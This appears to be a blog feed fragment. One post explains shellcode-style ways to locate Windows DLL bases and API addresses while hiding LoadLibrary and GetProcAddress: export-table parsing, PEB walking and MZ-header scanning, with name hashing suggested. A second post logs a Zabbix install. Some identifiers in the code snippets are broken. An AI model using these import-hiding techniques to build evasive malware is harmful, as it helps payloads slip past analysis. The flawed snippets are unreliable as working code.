    <content type="html"><![CDATA[<p>一些基础啦</p><h1 id="C语言的常规方法"><a href="#C语言的常规方法" class="headerlink" title="C语言的常规方法"></a>C语言的常规方法</h1><p>使用<em>LoadLibrary</em>与<em>GetProcAddress</em>这两个API</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PDWORD _addr = (<span class="name">PDWORD</span>)GetProcAddress(<span class="name">LoadLibrary</span>(<span class="name">&lt;DllName&gt;</span>), &lt;FunctionName&gt;)<span class="comment">;</span></span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="隐藏-GetProcAddress"><a href="#隐藏-GetProcAddress" class="headerlink" title="隐藏 GetProcAddress"></a>隐藏 GetProcAddress</h2><p>使用pe头,mz头-&gt;pe头-&gt;导入表-&gt;遍历-&gt;比较Name-&gt;获得NameOrdinals-&gt;取Functions,得到函数在内存中基地址的偏移量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PDWORD _addr = <span class="literal">nullptr</span>;</span><br><span class="line">_base_addrODULE _base_addr = LoadLibrary(&lt;DllName&gt;);</span><br><span class="line">PIMAGE_DOS_HEADER pdh = (PIMAGE_DOS_HEADER)_base_addr;</span><br><span class="line">PIMAGE_NT_HEADERS pnt = (PIMAGE_NT_HEADERS)(_base_addr + pdh-&gt;e_lfanew);</span><br><span class="line">PIMAGE_EXPORT_DIRECTORY pexports = (PIMAGE_EXPORT_DIRECTORY)(_base_addr + </span><br><span class="line">                      pnt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">PDWORD _Functions = (PDWORD)(_base_addr + pexports-&gt;AddressOfFunctions);</span><br><span class="line">PDWORD _Name = (PDWORD)(_base_addr + pexports-&gt;AddressOfNames);</span><br><span class="line">PDWORD _NameOrdinals = (PWORD)(_base_addr + pexports-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; pexports-&gt;NumberOfNames; i++) &#123;</span><br><span class="line">    <span class="comment">//甚至你还可以用hash比较,来隐藏函数名的明文字符串,就像meterpreter</span></span><br><span class="line">    <span class="comment">//if (_hash_calc(_base_addr + _Name[i]) == _hash_calc(&lt;FunctionName&gt;)) &#123;</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(_base_addr + _Name[i], &lt;FunctionName&gt;)) &#123;</span><br><span class="line">        _addr = _base_addr + _Function[_NameOrdinals[i]];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="隐藏-LoadLibrary"><a href="#隐藏-LoadLibrary" class="headerlink" title="隐藏 LoadLibrary"></a>隐藏 LoadLibrary</h2><p>这里只讨论获取已加载dll的基地址</p><h3 id="通过fs获取"><a href="#通过fs获取" class="headerlink" title="通过fs获取"></a>通过fs获取</h3><p>使用PEB头,TEB-&gt;PEB(fs:[30])-&gt;PEB_LDR_DATA(_LDR_DATA_TABLE_ENTRY-0x10)-&gt;遍历-&gt;BaseDllName/DllBase,取得基地址<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_PEB_LDR_DATA</span><br><span class="line">   <span class="number">-0x00c</span> <span class="string">Length           :</span> Uint4B</span><br><span class="line">   <span class="number">-0x008</span> <span class="string">Initialized      :</span> UChar</span><br><span class="line">   <span class="number">-0x004</span> <span class="string">SsHandle         :</span> Ptr32 Void</span><br><span class="line">ntdll!_LDR_DATA_TABLE_ENTRY</span><br><span class="line">   +<span class="number">0x000</span> <span class="string">InLoadOrderLinks :</span> _LIST_ENTRY    <span class="comment">//第三个为kernel32</span></span><br><span class="line">   +<span class="number">0x008</span> <span class="string">InMemoryOrderLinks :</span> _LIST_ENTRY    <span class="comment">//EnumProcessModules(hProcess,*lphModule,cb,lpcbNeeded)</span></span><br><span class="line">   +<span class="number">0x010</span> <span class="string">InInitializationOrderLinks :</span> _LIST_ENTRY    <span class="comment">//CreateToolhelp32Snapshot(dwFlags,th32ProcessID)</span></span><br><span class="line">   +<span class="number">0x018</span> <span class="string">DllBase          :</span> Ptr32 Void     <span class="comment">//基地址</span></span><br><span class="line">   +<span class="number">0x01c</span> <span class="string">EntryPoint       :</span> Ptr32 Void</span><br><span class="line">   +<span class="number">0x020</span> <span class="string">SizeOfImage      :</span> Uint4B</span><br><span class="line">   +<span class="number">0x024</span> <span class="string">FullDllName      :</span> _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x02c</span> <span class="string">BaseDllName      :</span> _UNICODE_STRING  <span class="comment">//dll名</span></span><br><span class="line">   ...</span><br><span class="line">   +<span class="number">0x0a4</span> <span class="string">SigningLevel     :</span> UChar</span><br></pre></td></tr></table></figure></p><p>当然,前提是dll需要被加载<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PDWORD _base_addr<span class="comment">;</span></span><br><span class="line">LPWSTR _dll_name = nullptr<span class="comment">;</span></span><br><span class="line">PLIST_ENTRY pList<span class="comment">;</span></span><br><span class="line">__asm &#123;</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="built_in">fs</span>:[<span class="number">0x30</span>]    //<span class="built_in">dt</span> nt!_peb</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">eax</span> + <span class="number">0x0c</span>] //<span class="built_in">dt</span> nt!_PEB_LDR_DATA</span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">eax</span>, <span class="number">0x00c</span>        //<span class="built_in">dt</span> nt!_LDR_DATA_TABLE_ENTRY</span><br><span class="line">    <span class="keyword">mov</span> pList, <span class="built_in">eax</span></span><br><span class="line">&#125;</span><br><span class="line">PDWORD pFlag = (PDWORD)(pList-&gt;Blink)<span class="comment">;</span></span><br><span class="line"><span class="built_in">do</span></span><br><span class="line">&#123;</span><br><span class="line">    pList = pList-&gt;Flink<span class="comment">;</span></span><br><span class="line">    _base_addr = (PDWORD)((<span class="built_in">DWORD</span>)pList + <span class="number">0x018</span>)<span class="comment">;</span></span><br><span class="line">    _dll_name = (LPWSTR)(*(PDWORD)((<span class="built_in">DWORD</span>)pList + <span class="number">0x2c</span> + <span class="number">0x4</span>))<span class="comment">;</span></span><br><span class="line">    if(!wcscmp(_dll_name,&lt;DllName&gt;))//hash?</span><br><span class="line">    &#123;</span><br><span class="line">        break<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; while (pFlag != (PDWORD)pList)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p><h3 id="暴力搜索PE头"><a href="#暴力搜索PE头" class="headerlink" title="暴力搜索PE头"></a>暴力搜索PE头</h3><p>如果DLL被断链,据我了解,只能使用此种方法.<br>因为DLL被加载时,pe装载器会把DLL装载进内存的,所以我们只需要暴力搜索pe的文件头<strong>MZ</strong>,即可获取基地址.(当然,文件头不能被抹除)<br>又因为pe装载器内存是1k对齐的(SectionAlignment),所以我们只需要以1k为单位搜索即可.如果已知DLL内函数的地址,那就更容易搜索出来了.例如最外层SEH即指向kernel32.dll的<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PDWORD <span class="keyword">addr </span>= (PDWORD)GetProcAddress<span class="comment">;</span></span><br><span class="line"><span class="keyword">addr </span>= (PDWORD)((DWORD)<span class="keyword">addr </span>&amp; <span class="number">0xfffff000</span>)<span class="comment">;</span></span><br><span class="line">WORD _pe_flag = <span class="number">0x0</span><span class="comment">;</span></span><br><span class="line">while (true)</span><br><span class="line">&#123;</span><br><span class="line">    __try &#123;</span><br><span class="line">        _pe_flag = *(PWORD)<span class="keyword">addr;</span></span><br><span class="line"><span class="keyword"> </span>   &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        _pe_flag = <span class="number">0x0</span><span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">    if (_pe_flag == <span class="number">0x5a4d</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">break;</span></span><br><span class="line"><span class="keyword"> </span>   &#125;</span><br><span class="line">    <span class="keyword">addr </span>= (PDWORD)((DWORD)<span class="keyword">addr </span>- <span class="number">0x1000</span>)<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="ShellCode"><a href="#ShellCode" class="headerlink" title="ShellCode"></a>ShellCode</h1><p>待续</p><h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><ul><li>有说可以使用SEH搜索kernel32.dll,尝试后发现SEH调用的是ntdll的函数,搜索出来的是ntdll.dll的基地址</li><li>有说可以用poi(poi(poi(fs:0x18)+4)-0x1c)向上搜索,然而测试后发现所指的值为<em>0x0</em>.且<em>fs:0x18</em>所指处即为<em>fs</em>寄存器的值,多此一举.根本不知道这个操作是什么道理.</li><li>以上测试均在Win10 17763.253下进行</li></ul><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a><span style="font-size:14px">参考资料</span></h1><p><a href="https://bbs.pediy.com/thread-149527.htm" target="_blank" rel="noopener">InLoadOrderLinks第三个为kernel32</a><br>没读过不过差不多所有参考资料都有说的0day</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一些基础啦&lt;/p&gt;
&lt;h1 id=&quot;C语言的常规方法&quot;&gt;&lt;a href=&quot;#C语言的常规方法&quot; class=&quot;headerlink&quot; title=&quot;C语言的常规方法&quot;&gt;&lt;/a&gt;C语言的常规方法&lt;/h1&gt;&lt;p&gt;使用&lt;em&gt;LoadLibrary&lt;/em&gt;与&lt;em&gt;GetProcAddress&lt;/em&gt;这两个API&lt;/p&gt;
&lt;figure class=&quot;highlight lisp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;PDWORD _addr = (&lt;span class=&quot;name&quot;&gt;PDWORD&lt;/span&gt;)GetProcAddress(&lt;span class=&quot;name&quot;&gt;LoadLibrary&lt;/span&gt;(&lt;span class=&quot;name&quot;&gt;&amp;lt;DllName&amp;gt;&lt;/span&gt;), &amp;lt;FunctionName&amp;gt;)&lt;span class=&quot;comment&quot;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="windows" scheme="http://blog.qwerdf.com/tags/windows/"/>
    
      <category term="shellcode" scheme="http://blog.qwerdf.com/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>zabbix的安装与使用</title>
    <link href="http://blog.qwerdf.com/2019/01/04/zabbix/"/>
    <id>http://blog.qwerdf.com/2019/01/04/zabbix/</id>
    <published>2019-01-04T15:02:16.000Z</published>
    <updated>2019-01-16T11:34:42.973Z</updated>
    
    <content type="html"><![CDATA[<p>面试了一家公司,问我有没有用过zabbix.然而我并没有用过,讲道理之前最多打打补丁,系统搞搞加固,因为没出过什么大事也就一直这么搞了,并没有说时时刻刻监控着服务器,没有这个需求.<br>不过后来搜了搜,发现确实能解决一些痛点,于是就决定自己搭建一个看看怎么用.</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>系统是debian(其实是kali),直接apt-get安装莫名其妙没有找到数据库的sql文件(后来发现在包里有),索性直接源码编译安装了<br><a id="more"></a></p><h2 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h2><p>官网上下载,解压:<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop/zabbix-</span><span class="number">4.0</span>.<span class="number">3</span><span class="comment"># ./configure --enable-server --enable-agent --with-mysql\</span></span><br><span class="line">                      --enable-ipv6 --with-net-snmp --with-libcurl --with-libxml2</span><br><span class="line"><span class="symbol">configure:</span> <span class="symbol">error:</span> MySQL library <span class="keyword">not</span> found</span><br><span class="line"><span class="symbol">configure:</span> <span class="symbol">error:</span> LIBXML2 library <span class="keyword">not</span> found</span><br><span class="line"><span class="symbol">configure:</span> <span class="symbol">error:</span> Invalid Net-SNMP directory - unable to find net-snmp-config</span><br><span class="line"><span class="symbol">configure:</span> <span class="symbol">error:</span> Unable to <span class="keyword">use</span> libevent (libevent check failed)</span><br><span class="line"><span class="symbol">configure:</span> <span class="symbol">error:</span> Unable to <span class="keyword">use</span> libpcre (libpcre check failed)</span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop/zabbix-</span><span class="number">4.0</span>.<span class="number">3</span><span class="comment"># apt-get install default-libmysqlclient-dev libxml2-dev libevent-dev libpcre++-dev</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop/net-snmp-</span><span class="number">5.8</span><span class="comment"># ./configure --with-default-snmp-version="3" \</span></span><br><span class="line">                    --with-sys-contact=<span class="string">"@@no.where"</span> --with-sys-location=<span class="string">"Unknown"</span> </span><br><span class="line">--with-logfile=<span class="string">"/var/log/snmpd.log"</span> --with-persistent-directory=<span class="string">"/var/net-snmp"</span> <span class="comment">#好像没有现成的包</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop/net-snmp-</span><span class="number">5.8</span><span class="comment"># make&amp;&amp;make install</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop/net-snmp-</span><span class="number">5.8</span><span class="comment"># snmpget --version</span></span><br><span class="line">NET-SNMP <span class="symbol">version:</span> <span class="number">5.8</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop/zabbix-</span><span class="number">4.0</span>.<span class="number">3</span><span class="comment"># make&amp;&amp;make install</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop/zabbix-</span><span class="number">4.0</span>.<span class="number">3</span><span class="comment"># zabbix_agentd -V</span></span><br><span class="line">zabbix_agentd (daemon) (Zabbix) <span class="number">4.0</span>.<span class="number">3</span></span><br><span class="line">Revision <span class="number">87993</span> <span class="number">20</span> December <span class="number">2018</span>, compilation <span class="symbol">time:</span> Jan  <span class="number">5</span> <span class="number">2019</span> <span class="number">14</span><span class="symbol">:</span><span class="number">02</span><span class="symbol">:</span><span class="number">48</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop/zabbix-</span><span class="number">4.0</span>.<span class="number">3</span><span class="comment"># zabbix_server -V</span></span><br><span class="line">zabbix_server (Zabbix) <span class="number">4.0</span>.<span class="number">3</span></span><br><span class="line">Revision <span class="number">87993</span> <span class="number">20</span> December <span class="number">2018</span>, compilation <span class="symbol">time:</span> Jan  <span class="number">5</span> <span class="number">2019</span> <span class="number">14</span><span class="symbol">:</span><span class="number">02</span><span class="symbol">:</span><span class="number">48</span></span><br></pre></td></tr></table></figure></p><h2 id="配置zabbix-server"><a href="#配置zabbix-server" class="headerlink" title="配置zabbix_server"></a>配置zabbix_server</h2><p>zabbix server简单来说就是管理服务器的服务器<br>新建用户zabbix<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop/zabbix-</span><span class="number">4.0</span>.<span class="number">3</span><span class="comment"># groupadd zabbix</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop/zabbix-</span><span class="number">4.0</span>.<span class="number">3</span><span class="comment"># useradd -g zabbix zabbix</span></span><br></pre></td></tr></table></figure></p><p>创建数据库zabbix<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop/zabbix-</span><span class="number">4.0</span>.<span class="number">3</span><span class="comment"># mysql -uroot -p</span></span><br><span class="line">MariaDB [(none)]&gt; create database zabbix character set utf8 collate utf8_bin;</span><br><span class="line">MariaDB [(none)]&gt; grant all privileges on zabbix.* to zabbix<span class="variable">@localhost</span> identified by <span class="string">'&lt;密码&gt;'</span>;</span><br></pre></td></tr></table></figure></p><p>导入数据库<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop/zabbix-</span><span class="number">4.0</span>.<span class="number">3</span><span class="comment"># mysql -uzabbix zabbix &lt; /database/mysql/schema.sql</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop/zabbix-</span><span class="number">4.0</span>.<span class="number">3</span><span class="comment"># mysql -uzabbix zabbix &lt; /database/mysql/images.sql</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop/zabbix-</span><span class="number">4.0</span>.<span class="number">3</span><span class="comment"># mysql -uzabbix zabbix &lt; /database/mysql/data.sql</span></span><br></pre></td></tr></table></figure></p><p>在<em>/usr/local/etc/zabbix_server.conf</em>中配置数据库信息<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop/zabbix-</span><span class="number">4.0</span>.<span class="number">3</span>/src<span class="comment"># grep -e '^DB' /usr/local/etc/zabbix_server.conf</span></span><br><span class="line">DBName=zabbix</span><br><span class="line">DBUser=zabbix</span><br><span class="line">DBPassword=password</span><br></pre></td></tr></table></figure></p><h2 id="配置zabbix-agentd"><a href="#配置zabbix-agentd" class="headerlink" title="配置zabbix_agentd"></a>配置zabbix_agentd</h2><p>zabbix agentd简单来说就是被管理被监控的服务器<br>在<em>/usr/local/etc/zabbix_agentd.conf</em>中配置服务器信息即可<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop/zabbix-</span><span class="number">4.0</span>.<span class="number">3</span><span class="comment"># grep -e '^S' /usr/local/etc/zabbix_agentd.conf</span></span><br><span class="line">Server=<span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span></span><br><span class="line">ServerActive=<span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure></p><h2 id="配置zabbix-frontends"><a href="#配置zabbix-frontends" class="headerlink" title="配置zabbix_frontends"></a>配置zabbix_frontends</h2><p>zabbix frontends简单来说就是zabbix_server的gui界面<br>复制所需文件:<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop/zabbix-</span><span class="number">4.0</span>.<span class="number">3</span><span class="comment"># cp -a frontends/php/ /var/www/html/zabbix</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop/zabbix-</span><span class="number">4.0</span>.<span class="number">3</span><span class="comment"># chown -R www-data:www-data /var/www/html/</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop/zabbix-</span><span class="number">4.0</span>.<span class="number">3</span><span class="comment"># apt-get install php7.2-bcmath php7.2-mbstring php7.2-gd php7.2-xml</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop/zabbix-</span><span class="number">4.0</span>.<span class="number">3</span><span class="comment"># service apache2 restart</span></span><br></pre></td></tr></table></figure></p><p>打开 <a href="http://localhost/zabbix/" target="_blank" rel="noopener">http://localhost/zabbix/</a> 即可web安装.<br><img src="data:image/png;base64,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